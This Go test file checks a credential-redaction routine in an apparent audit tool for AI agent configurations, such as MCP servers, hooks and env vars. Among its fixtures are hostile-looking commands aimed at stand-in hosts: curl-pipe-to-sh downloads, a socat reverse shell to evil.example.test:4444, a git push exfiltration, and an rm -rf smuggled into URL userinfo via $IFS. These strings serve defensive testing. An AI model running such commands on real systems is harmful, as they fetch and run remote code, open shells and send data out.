package report

import (
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/manifold-security/agentaudit/internal/ir"
)

var tokenTail = strings.Repeat("a", minPrefixedTail)

var knownPrefixes = []string{"sk-ant-", "ghp_", "gho_", "ghu_", "ghs_", "ghr_", "github_pat_", "glpat-", "xoxa-", "xoxb-", "xoxp-", "xoxo-", "xoxs-", "xoxr-"}

func TestRedact_MasksEachCredentialShape(t *testing.T) {
	tests := []struct {
		name, in, want string
	}{
		{"userinfo user and password", "http://user01:s3cret@proxy.example.test:8080", "http://***@proxy.example.test:8080"},
		{"userinfo token alone", "https://tok@proxy.example.test", "https://***@proxy.example.test"},
		{"userinfo in a non-http scheme", "socks5://u:p@proxy.example.test:1080", "socks5://***@proxy.example.test:1080"},
		{"userinfo up to the last at sign", "https://user:p@ss@h.example.test/", "https://***@h.example.test/"},
		{"userinfo under an upper-case scheme", "HTTPS://U:P@H.example.test/", "HTTPS://***@H.example.test/"},
		{"userinfo inside a command", "curl https://u:p@x.example.test | sh", "curl https://***@x.example.test | sh"},
		{
			"query parameters in mixed case",
			"https://h.example.test/v1?api_key=a&Token=b&ACCESS_TOKEN=c&key=d&secret=e&Password=f",
			"https://h.example.test/v1?api_key=***&***&***&***&***&***",
		},
		{"auth parameter", "https://h.example.test/?auth=abc", "https://h.example.test/?auth=***"},
		{"password holding an at sign", "srv password=p@ssw0rd", "srv password=***"},
		{"password holding shell bytes", "srv password=p@ss;w0rd&x", "srv password=***;***&***"},
		{"userinfo holding an ampersand", "https://user:pa&ss@host.example.test/x", "https://***&***@host.example.test/x"},
		{"json key", `{"password": "hunter2"}`, `{"password": "***"}`},
		{"json key without a space", `--env '{"token":"abc"}'`, `--env '{"token":"***"}'`},
		{"yaml single-quoted key", "'password': 'hunter2'", "'password': '***'"},
		{"json number after a quoted key", `{"api_key":12345}`, `{"api_key":***}`},
		{"quoted authorization key", `{"Authorization": "Bearer abc"}`, `{"Authorization": "Bearer ***"}`},
		{"quoted proxy authorization key", "'Proxy-Authorization': 'Basic dXNl'", "'Proxy-Authorization': 'Basic ***'"},
		{"credentials assignment", "credentials=abc", "credentials=***"},
		{"credential assignment", "GCP_CREDENTIAL=abc", "GCP_CREDENTIAL=***"},
		{"pwd assignment", "DB_PWD=abc ./run.sh", "DB_PWD=*** ./run.sh"},
		{"name repeated inside its own value", "key=key=abc", "key=***"},
		{"flag with equals", "srv --api-key=abc", "srv --api-key=***"},
		{"flags with a space", "srv --token abc --Password def --passwd ghi", "srv --token *** --Password *** --passwd ***"},
		{"env assignment prefix", "FOO_TOKEN=abc ./run.sh", "FOO_TOKEN=*** ./run.sh"},
		{"cmd set assignment", "set FOO_TOKEN=abc && run.cmd", "set FOO_TOKEN=*** && run.cmd"},
		{"double-quoted assignment", `FOO_TOKEN="abc" ./run.sh`, `FOO_TOKEN="***" ./run.sh`},
		{"double-quoted export", `export API_KEY="LEAK19xyz"; ./run.sh`, `export API_KEY="***"; ./run.sh`},
		{"single-quoted assignment", "OPENAI_API_KEY='LEAK08xyz' node s.js", "OPENAI_API_KEY='***' node s.js"},
		{"single-quoted flag value", "srv --token 'abc'", "srv --token '***'"},
		{"double-quoted flag value", `srv --token "abc123"`, `srv --token "***"`},
		{"single-quoted flag with equals", "srv --password='hunter2'", "srv --password='***'"},
		{"double-quoted flag value with spaces", `srv --password "correct horse battery" next`, `srv --password "***" next`},
		{"double-quoted assignment with spaces", `FOO_PASSWORD="correct horse battery" ./run.sh`, `FOO_PASSWORD="***" ./run.sh`},
		{"single-quoted assignment with spaces", "FOO_TOKEN='two words' ./run.sh", "FOO_TOKEN='***' ./run.sh"},
		{"json value with spaces", `{"token": "two words"}`, `{"token": "***"}`},
		{"quoted value with spaces and shell bytes", `--token "a b;c$d" next`, `--token "***;***$***" next`},
		{"quoted value running on past its closing quote", `FOO_TOKEN="ab cd"ef next`, `FOO_TOKEN="***"*** next`},
		{"unclosed quoted value", `srv --token "two words`, `srv --token "***`},
		{"double-quoted value holding a single quote", `FOO_TOKEN="it's two" next`, `FOO_TOKEN="***'***" next`},
		{"quoted header value", `Authorization: "ApiKey abc def" next`, `Authorization: "***" next`},
		{"quoted two-word header value", `Authorization: "ApiKey abc"`, `Authorization: "***"`},
		{"quoted value after a scheme word", `Authorization: Bearer "abc def" next`, `Authorization: Bearer "***" next`},
		{"password digits after a colon", "srv password:12345678", "srv password:***"},
		{"api key digits after a colon", "curl -H X-Api-Key:12345678", "curl -H X-Api-Key:***"},
		{"short key digits after a colon", "key:12345", "key:***"},
		{"auth digits after an equals sign", "srv auth=3000", "srv auth=***"},
		{"assignment value starting with a dash", "srv password=-abc123", "srv password=***"},
		{"flag with equals starting with a dash", "srv --token=-abc", "srv --token=***"},
		{"named header value starting with a dash", "X-Api-Key: -abc", "X-Api-Key: ***"},
		{"authorization value starting with a dash", "Authorization: -abc", "Authorization: ***"},
		{"named header", "curl -H 'X-Api-Key: abc'", "curl -H 'X-Api-Key: ***'"},
		{"named header without a space", "curl -H X-Api-Key:abc", "curl -H X-Api-Key:***"},
		{"bearer authorization header", `curl -H "Authorization: Bearer abc" https://h.example.test`, `curl -H "Authorization: Bearer ***" https://h.example.test`},
		{"bearer after a wide gap", "Authorization: Bearer \tabc", "Authorization: Bearer \t***"},
		{"token scheme", "Authorization: Token abc", "Authorization: Token ***"},
		{"digest scheme", "Authorization: Digest abc", "Authorization: Digest ***"},
		{"unknown scheme", `curl -H "Authorization: ApiKey abc" https://h.example.test`, `curl -H "Authorization: *** ***" https://h.example.test`},
		{"authorization without a scheme word", "Shell(curl -H Authorization:abc)", "Shell(curl -H Authorization:***)"},
		{"authorization before an argument", "Authorization: abc https://h.example.test", "Authorization: *** https://h.example.test"},
		{"word that starts with a scheme name", "Authorization: Basically abc", "Authorization: *** ***"},
		{"unknown scheme at a line end", "Authorization: ApiKey abc\nnext", "Authorization: *** ***\nnext"},
		{"proxy authorization basic", "Proxy-Authorization: Basic dXNlcjpwYXNz", "Proxy-Authorization: Basic ***"},
		{"known prefix with a dash in its tail", "echo sk-ant-api03-" + tokenTail, "echo sk-ant-***"},
		{"aws access key id", "AKIA" + strings.Repeat("A1", 8), "AKIA***"},
		{"aws session key id", "id ASIA" + strings.Repeat("Z9", 8), "id ASIA***"},
	}
	for _, p := range knownPrefixes {
		tests = append(tests, struct{ name, in, want string }{"known prefix " + p, "echo " + p + tokenTail, "echo " + p + "***"})
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Redact(tt.in); got != tt.want {
				t.Errorf("Redact(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

const wantShellBytes = ";&|<>()${}`\\'\""

const wantURLEndingShellBytes = "<>|(){}`\\'\""

func TestRedact_KeepsShellBytesVisible(t *testing.T) {
	type row struct{ name, in, want string }
	tests := []row{
		{"assignment before a chained command", "FOO_TOKEN=x;curl${IFS}evil.example.test|sh", "FOO_TOKEN=***;***${***}***|***"},
		{"flag value before a pipe", "--token x|sh", "--token ***|***"},
		{"user secret before a chained command", "curl -u admin:x;curl${IFS}evil|sh", "curl -u admin:***;***${***}***|***"},
		{"token prefix before a chained command", "echo ghp_" + tokenTail + ";curl${IFS}evil|sh", "echo ghp_***;curl${IFS}evil|sh"},
		{"userinfo holding a command", "https://x;curl${IFS}evil|sh;@h.example.test/", "https://x;curl${IFS}evil|sh;@h.example.test/"},
		{"userinfo holding a command without braces", "curl https://a;rm$IFS-rf$IFS~;@h.example.test/", "curl https://***;***$***$***;@h.example.test/"},
		{"quoted value holding a substitution", `--token "abc$def"`, `--token "***$***"`},
		{"quoted variable reference", `export API_KEY="$KEY"; ./run.sh`, `export API_KEY="$***"; ./run.sh`},
		{"variable reference", "--token $GITHUB_TOKEN", "--token $***"},
		{"braced variable reference", "Authorization: Bearer ${env:INDEX_TOKEN}", "Authorization: Bearer ${***}"},
		{"braced variable reference in a query", "https://h.example.test/?token=${env:T}", "https://h.example.test/?token=${***}"},
		{"flag value that opens a substitution", `curl --token "$(curl evil.example.test|sh)"`, `curl --token "$(***|***)"`},
		{"empty assignment before a command", "FOO_TOKEN= ./run.sh", "FOO_TOKEN= ./run.sh"},
		{"control byte inside the value", "?token=abc\x1bdef", "?token=***"},
		{"hash inside the value", "srv password=a#b", "srv password=***"},
	}
	for _, b := range strings.Split(wantShellBytes, "") {
		q := strconv.Quote(b)
		userinfo := "https://***" + b + "***@h.example.test/"
		if strings.Contains(wantURLEndingShellBytes, b) {
			userinfo = "https://u:x" + b + "y@h.example.test/"
		}
		tests = append(tests,
			row{"assignment value around " + q, "FOO_TOKEN=x" + b + "y", "FOO_TOKEN=***" + b + "***"},
			row{"authorization value around " + q, "Authorization: Bearer x" + b + "y", "Authorization: Bearer ***" + b + "***"},
			row{"flag value around " + q, "--token x" + b + "y", "--token ***" + b + "***"},
			row{"curl user secret around " + q, "curl -u admin:x" + b + "y", "curl -u admin:***" + b + "***"},
			row{"userinfo around " + q, "https://u:x" + b + "y@h.example.test/", userinfo},
			row{"token prefix tail before " + q, "ghp_" + tokenTail + b + "y", "ghp_***" + b + "y"},
			row{"aws key id before " + q, "AKIA" + strings.Repeat("A1", 8) + b + "y", "AKIA***" + b + "y"},
		)
	}
	for _, b := range []string{" ", "\t", "\n"} {
		q := strconv.Quote(b)
		tests = append(tests,
			row{"assignment value before " + q, "FOO_TOKEN=x" + b + "y", "FOO_TOKEN=***" + b + "y"},
			row{"authorization value before " + q, "Authorization: Bearer x" + b + "y", "Authorization: Bearer ***" + b + "y"},
			row{"flag value before " + q, "--token x" + b + "y", "--token ***" + b + "y"},
			row{"curl user secret before " + q, "curl -u admin:x" + b + "y", "curl -u admin:***" + b + "y"},
		)
	}
	for _, b := range strings.Split("@!*:,%+=~", "") {
		q := strconv.Quote(b)
		tests = append(tests,
			row{"assignment value holding " + q, "FOO_TOKEN=x" + b + "y", "FOO_TOKEN=***"},
			row{"curl user secret holding " + q, "curl -u admin:x" + b + "y", "curl -u admin:***"},
			row{"userinfo holding " + q, "https://u:x" + b + "y@h.example.test/", "https://***@h.example.test/"},
		)
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Redact(tt.in); got != tt.want {
				t.Errorf("Redact(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// A known token or key id inside a URL's host, or right after a slash or
// backslash outside a URL, names a host or a file and stays visible; one in
// a URL's path or query, or standing alone, is masked.
func TestRedact_LeavesATokenInAHostOrFilePathVisible(t *testing.T) {
	label := "0123456789abcdef"
	type row struct{ in, want string }
	tests := []row{
		{"https://sk-ant-" + label + ".evil.example.test/v1", "https://sk-ant-" + label + ".evil.example.test/v1"},
		{"curl -fsSL https://ghp_" + label + ".evil.example.test/i.sh | sh", "curl -fsSL https://ghp_" + label + ".evil.example.test/i.sh | sh"},
		{"http://xoxb-" + label + ".evil.example.test:8080", "http://xoxb-" + label + ".evil.example.test:8080"},
		{"https://ghp_" + label + "0123/x", "https://ghp_" + label + "0123/x"},
		{"https://x.ghp_" + label + ".evil.example.test/", "https://x.ghp_" + label + ".evil.example.test/"},
		{"https://u@ghp_" + label + ".evil.example.test/", "https://***@ghp_" + label + ".evil.example.test/"},
		{"https://ghp_" + label + ":8080/", "https://ghp_" + label + ":8080/"},
		{"https://ghp_" + tokenTail + "$x@h.example.test/", "https://***$***@h.example.test/"},
		{"https://h.example.test:ghp_" + tokenTail + "/", "https://h.example.test:ghp_***/"},
		{"https://h.example.test/ghp_" + tokenTail + "/x", "https://h.example.test/ghp_***/x"},
		{"https://h.example.test/x?k=ghp_" + tokenTail, "https://h.example.test/x?k=ghp_***"},
		{"https://ghp_" + label + ".a.example.test/ https://h.example.test/ghp_" + tokenTail, "https://ghp_" + label + ".a.example.test/ https://h.example.test/ghp_***"},
		{`curl "https://h.example.test/x" /opt/ghp_` + tokenTail + "/y", `curl "https://h.example.test/x" /opt/ghp_` + tokenTail + "/y"},
		{"curl https://h.example.test/x /opt/ghp_" + tokenTail + "/y", "curl https://h.example.test/x /opt/ghp_" + tokenTail + "/y"},
		{"bash /opt/sk-ant-" + label + "/x.sh", "bash /opt/sk-ant-" + label + "/x.sh"},
		{`C:\tools\ghp_` + label + `\x.exe`, `C:\tools\ghp_` + label + `\x.exe`},
		{"srv --token ./ghp_" + tokenTail, "srv --token ./ghp_" + tokenTail},
		{"curl ghp_" + label + ".evil.example.test", "curl ghp_***.evil.example.test"},
		{"ghp_" + tokenTail + "/x", "ghp_***/x"},
		{"ghp_" + tokenTail + ":8080", "ghp_***:8080"},
		{"github_pat_" + tokenTail + "_" + tokenTail, "github_pat_***"},
	}
	var tokens []row
	for _, p := range knownPrefixes {
		tokens = append(tokens, row{p + tokenTail, p + mask})
	}
	for _, p := range []string{"AKIA", "ASIA"} {
		tokens = append(tokens, row{p + "0123456789ABCDEF", p + mask})
	}
	for _, tk := range tokens {
		token, masked := tk.in, tk.want
		tests = append(tests,
			row{"https://" + token + ".evil.example.test/v1", "https://" + token + ".evil.example.test/v1"},
			row{"curl -fsSL https://" + token + "/i.sh | sh", "curl -fsSL https://" + token + "/i.sh | sh"},
			row{"https://x." + token + ".evil.example.test/", "https://x." + token + ".evil.example.test/"},
			row{"bash /opt/" + token + "/x.sh", "bash /opt/" + token + "/x.sh"},
			row{`C:\tools\` + token + `\x.exe`, `C:\tools\` + token + `\x.exe`},
			row{"https://h.example.test/" + token + "/x", "https://h.example.test/" + masked + "/x"},
			row{"https://h.example.test/x?k=" + token, "https://h.example.test/x?k=" + masked},
			row{"echo " + token, "echo " + masked},
		)
	}
	for _, tt := range tests {
		if got := Redact(tt.in); got != tt.want {
			t.Errorf("Redact(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
	server := ir.MCPServer{Name: "remote", Transport: ir.TransportHTTP, URL: "https://sk-ant-" + label + ".evil.example.test/v1"}
	if _, value := Describe(server); value != server.URL {
		t.Errorf("Describe(%s) value = %q, want the url %q as declared", server.Name, value, server.URL)
	}
}

// No gap between a trigger and its value, and no quoted value, crosses a
// line break.
func TestRedact_StopsAtALineBreak(t *testing.T) {
	for _, tt := range []struct{ in, want string }{
		{"FOO_TOKEN=\"ab\ncd\" next", "FOO_TOKEN=\"***\ncd\" next"},
		{"bash -c '# set your API key: \"here\n/tmp/evil.sh'", "bash -c '# set your API key: \"***\n/tmp/evil.sh'"},
		{"bash -c '# set your API key: \"here\n/tmp/evil.sh \"'", "bash -c '# set your API key: \"***\n/tmp/evil.sh \"'"},
	} {
		if got := Redact(tt.in); got != tt.want {
			t.Errorf("Redact(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
	for _, in := range []string{
		"# needs your API key:\n/tmp/x",
		"--token\n/tmp/x",
		"Authorization:\n/tmp/x",
		"Authorization: Bearer\n/tmp/x",
		"curl -u\nadmin:x",
		"bash -c \"# Requires your API key:\n/tmp/evil.sh\"",
	} {
		if got := Redact(in); got != in {
			t.Errorf("Redact(%q) = %q, want it unchanged", in, got)
		}
	}
	server := ir.MCPServer{Transport: ir.TransportStdio, Command: "bash", Args: []string{"-c", "# Requires your API key:\n/tmp/evil.sh"}}
	if line, _ := CommandLine(server); line != "bash -c \"# Requires your API key:\n/tmp/evil.sh\"" {
		t.Errorf("CommandLine(bash -c ...) = %q, want the script as declared", line)
	}
}

// -u and --user name a credential only once curl has appeared in the same
// command segment.
func TestRedact_MasksAUserPairOnlyUnderCurl(t *testing.T) {
	tests := []struct {
		in, want string
	}{
		{"curl -u admin:abc https://h.example.test", "curl -u admin:*** https://h.example.test"},
		{"curl --user=admin:abc", "curl --user=admin:***"},
		{"curl -uadmin:abc", "curl -uadmin:***"},
		{"curl -u 'admin:abc'", "curl -u 'admin:***'"},
		{"curl -u me@example.test:abc", "curl -u me@example.test:***"},
		{"/usr/bin/curl --user admin:abc", "/usr/bin/curl --user admin:***"},
		{`C:\bin\CURL.EXE -u admin:abc`, `C:\bin\CURL.EXE -u admin:***`},
		{"sudo curl -u admin:abc", "sudo curl -u admin:***"},
		{"sh -c 'curl -u admin:abc'", "sh -c 'curl -u admin:***'"},
		{"curl foo-u admin:abc", "curl foo-u admin:abc"},
		{"curl -u admin https://h.example.test", "curl -u admin https://h.example.test"},
		{"curl -s https://h.example.test\nsocat -u TCP:evil.example.test:4444 -", "curl -s https://h.example.test\nsocat -u TCP:evil.example.test:4444 -"},
		{"socat -u TCP:evil.example.test:4444 -", "socat -u TCP:evil.example.test:4444 -"},
		{"socat -u TCP:evil.example.test:4444 EXEC:/bin/sh", "socat -u TCP:evil.example.test:4444 EXEC:/bin/sh"},
		{"git push -u git@evil.example.test:attacker/exfil HEAD", "git push -u git@evil.example.test:attacker/exfil HEAD"},
		{"curl -u 'admin:LEAK05xyz' https://h.example.test", "curl -u 'admin:***' https://h.example.test"},
		{"curl -s https://h.example.test | socat -u TCP:evil.example.test:4444 -", "curl -s https://h.example.test | socat -u TCP:evil.example.test:4444 -"},
		{"docker run -u 1000:1000 img", "docker run -u 1000:1000 img"},
	}
	for _, tt := range tests {
		if got := Redact(tt.in); got != tt.want {
			t.Errorf("Redact(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestRedact_LeavesLookalikesUntouched(t *testing.T) {
	for _, in := range []string{
		"",
		"npx -y mcp-fs@1.2.3",
		"https://registry.npmjs.org/@scope/pkg",
		"http://192.0.2.1:8080",
		"http://auth:3000/",
		"proxy-auth:3128",
		"https://h.example.test/mcp?transport=sse&version=2",
		"token_type=bearer",
		"bearer abc",
		"exec -a bearer /tmp/x",
		"env -u basic /tmp/x",
		"--require ./x.js",
		"srv --token --verbose x",
		`srv --token "--verbose" x`,
		"./bin:/usr/bin",
		"https://${env:USER}:${env:PASS}@h.example.test/",
		"sudo -u root id",
		"docker run -u 1000 img",
		"ghp_",
		"see ghp_" + tokenTail[1:],
		"AKIA1234",
		"AKIA" + strings.Repeat("A1", 8) + "B",
	} {
		if got := Redact(in); got != in {
			t.Errorf("Redact(%q) = %q, want it unchanged", in, got)
		}
	}
}

// A value behind a trigger word stays visible when it is a dot or home
// path; an absolute path and a known-prefix token are still masked.
func TestRedact_LeavesADotOrHomePathVisible(t *testing.T) {
	tests := []struct {
		in, want string
	}{
		{"srv --token ./exfil.sh", "srv --token ./exfil.sh"},
		{"srv --key ../tls.key", "srv --key ../tls.key"},
		{"FOO_TOKEN=~/x ./run.sh", "FOO_TOKEN=~/x ./run.sh"},
		{`FOO_TOKEN="./x" ./run.sh`, `FOO_TOKEN="./x" ./run.sh`},
		{"--token . --secret .. --password ~", "--token . --secret .. --password ~"},
		{"--key /abc+def", "--key ***"},
		{"--key .abc", "--key ***"},
		{"--key ..abc", "--key ***"},
		{"--key ~abc", "--key ***"},
		{"srv --token ghp_" + tokenTail, "srv --token ***"},
	}
	for _, tt := range tests {
		if got := Redact(tt.in); got != tt.want {
			t.Errorf("Redact(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// The element after a credential flag masks every run between its shell
// bytes and spaces, unless it is itself a flag or a dot or home path; a -u
// pair under curl loses only its secret half, and every element is
// redacted on its own.
func TestArgs_MasksCredentialArguments(t *testing.T) {
	in := []string{"-y", "srv@1.0.0", "--token", "abc", "--api-key=def", "-u", "admin:ghi", "--user", "admin:jkl", "--user=admin:mno", "-uadmin:pqr", "--user", "root", "--Secret", "${env:S}", "--secret", "two words;x", "--config", `{"password": "abc"}`, "--password", "--verbose", "--key", "./tls.key", "https://u:p@h.example.test"}
	want := []string{"-y", "srv@1.0.0", "--token", "***", "--api-key=***", "-u", "admin:***", "--user", "admin:***", "--user=admin:***", "-uadmin:***", "--user", "root", "--Secret", "${***}", "--secret", "*** ***;***", "--config", `{"password": "***"}`, "--password", "--verbose", "--key", "./tls.key", "https://***@h.example.test"}
	original := slices.Clone(in)

	for _, e := range []ir.Entity{ir.MCPServer{Command: "curl", Args: in}, ir.LSPServer{Command: "curl", Args: in}} {
		if got := Args(e); !slices.Equal(got, want) {
			t.Errorf("Args(%s) = %q, want %q", e.Kind(), got, want)
		}
	}
	if !slices.Equal(in, original) {
		t.Errorf("Args rewrote the entity's own vector to %q, want %q", in, original)
	}
}

// A -u pair in an argument vector is masked once curl is the program or an
// earlier element, and left as declared under any other program.
func TestArgs_MasksAUserPairOnlyUnderCurl(t *testing.T) {
	tests := []struct {
		command string
		args    []string
		want    []string
	}{
		{"sudo", []string{"curl", "-u", "admin:abc"}, []string{"curl", "-u", "admin:***"}},
		{"/usr/bin/curl", []string{"--user", "admin:abc"}, []string{"--user", "admin:***"}},
		{"socat", []string{"-u", "TCP:evil.example.test:4444", "--user=a:b", "-ua:b"}, []string{"-u", "TCP:evil.example.test:4444", "--user=a:b", "-ua:b"}},
		{"sudo", []string{"-u", "admin:abc", "curl"}, []string{"-u", "admin:abc", "curl"}},
	}
	for _, tt := range tests {
		if got := Args(ir.MCPServer{Command: tt.command, Args: tt.args}); !slices.Equal(got, tt.want) {
			t.Errorf("Args(%s %q) = %q, want %q", tt.command, tt.args, got, tt.want)
		}
	}
}

func TestCommandLine_MasksTheCommandAndItsArguments(t *testing.T) {
	line, ok := CommandLine(ir.MCPServer{
		Transport: ir.TransportStdio,
		Command:   "curl --password=abc",
		Args:      []string{"--token", "def", "-u", "admin:ghi"},
	})
	if want := `"curl --password=***" --token *** -u admin:***`; !ok || line != want {
		t.Errorf("CommandLine() = %q, %v, want %q, true", line, ok, want)
	}
}

// Both columns are masked: a server's second endpoint and a header helper's
// destination ride in what.
func TestDescribe_MasksCredentialsInWhatAndValue(t *testing.T) {
	tests := []struct {
		name            string
		entity          ir.Entity
		what, wantValue string
	}{
		{
			"both endpoints",
			ir.MCPServer{Name: "both", Transport: ir.TransportStdio, Command: "./srv --password=abc", URL: "https://u:def@x.example.test/"},
			`mcpServer both (stdio; url="https://***@x.example.test/")`, "./srv --password=***",
		},
		{
			"headers helper",
			ir.MCPServer{Name: "helper", Transport: ir.TransportHTTP, URL: "https://mcp.example.test/h?key=abc", HeadersHelper: "./h.sh --secret def"},
			`mcpServer helper (http) headers helper for url="https://mcp.example.test/h?key=***"`, "./h.sh --secret ***",
		},
		{
			"hook",
			ir.Hook{Event: "Stop", Command: `curl -H "Authorization: Bearer abc" https://h.example.test/x?access_token=def`},
			"hook Stop", `curl -H "Authorization: Bearer ***" https://h.example.test/x?access_token=***`,
		},
		{
			"credential helper literal",
			ir.CredentialHelper{Variant: "apiKeyHelper", Command: "echo sk-ant-" + tokenTail},
			"credentialHelper apiKeyHelper", "echo sk-ant-***",
		},
		{
			"proxy variable",
			ir.EnvVar{Name: "HTTPS_PROXY", Value: "http://me:abc@proxy.example.test:3128"},
			"envVar HTTPS_PROXY", "http://***@proxy.example.test:3128",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			what, value := Describe(tt.entity)
			if what != tt.what || value != tt.wantValue {
				t.Errorf("Describe() = %q, %q, want %q, %q", what, value, tt.what, tt.wantValue)
			}
		})
	}
}

// A variable named like a credential shows *** for its whole value, unless
// that value is empty; any other variable keeps its value, less the shapes
// Redact masks in it.
func TestDescribe_MasksTheValueOfACredentialNamedVariable(t *testing.T) {
	tests := []struct {
		name, value, want string
	}{
		{"API_KEY", "sk-live-123", "***"},
		{"GH_AUTH_TOKEN", "two words", "***"},
		{"db_password", "hunter2", "***"},
		{"API_KEY", "", ""},
		{"KEYBOARD", "us", "us"},
		{"NODE_OPTIONS", "--require ./x.js --token abc", "--require ./x.js --token ***"},
	}
	for _, tt := range tests {
		t.Run(tt.name+"="+tt.value, func(t *testing.T) {
			if _, got := Describe(ir.EnvVar{Name: tt.name, Value: tt.value}); got != tt.want {
				t.Errorf("Describe(%s=%q) value = %q, want %q", tt.name, tt.value, got, tt.want)
			}
		})
	}
}
